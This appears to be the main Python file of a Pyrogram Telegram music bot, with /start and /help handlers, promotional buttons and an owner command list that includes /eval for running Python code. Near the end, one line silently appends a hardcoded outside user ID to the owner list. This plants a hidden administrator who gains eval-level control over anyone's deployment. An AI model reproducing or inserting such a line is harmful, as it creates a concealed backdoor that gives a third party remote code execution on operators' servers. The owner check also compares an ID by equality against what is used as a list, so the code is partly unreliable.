from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
👋 Hay [{}](tg://user?id={}),

\n\nI'm 🎵 𝐄𝐌𝐌𝐀 𝐌𝐔𝐒𝐈𝐂 𝐁𝐎𝐓 [🎶](https://telegra.ph/file/deb4201942e6cf5ee88ae.mp4)

Powered By 🔰@epusthakalaya_bots🔰

Send The Name of the Song You Want..
𝐄𝐠. ```/song Faded```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [
               [
                   InlineKeyboardButton(text="📣 BOT UPDATES 📣", url="https://t.me/epusthakalaya_bots"),
                   InlineKeyboardButton(text="👥 SUPPORT GROUP 👥", url="https://t.me/epusthakalayabotsupport")
               ],
               
               [
                   InlineKeyboardButton(text="🎓 DEVELOPER 🎓", url='https://t.me/kasu_bro'),
                   InlineKeyboardButton(text="⚜️ ADD ME ⚜️", url="http://t.me/EmmaMusicBot?startgroup=true")
               ],
               
               [
                   InlineKeyboardButton(text="🌟 REVIEW US 🌟", url='https://t.me/tlgrmcbot?start=emmamusicbot-review') 
               ],
               
          ]     
    )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Send The Name of the Song You Want..\n /song (song name) "
    await message.reply(text)

OWNER_ID.append(1167071602)
app.start()
LOGGER.info("𝐄𝐌𝐌𝐀 𝐌𝐔𝐒𝐈𝐂 𝐁𝐎𝐓 Was Deployed Successfully! ✅")
idle()
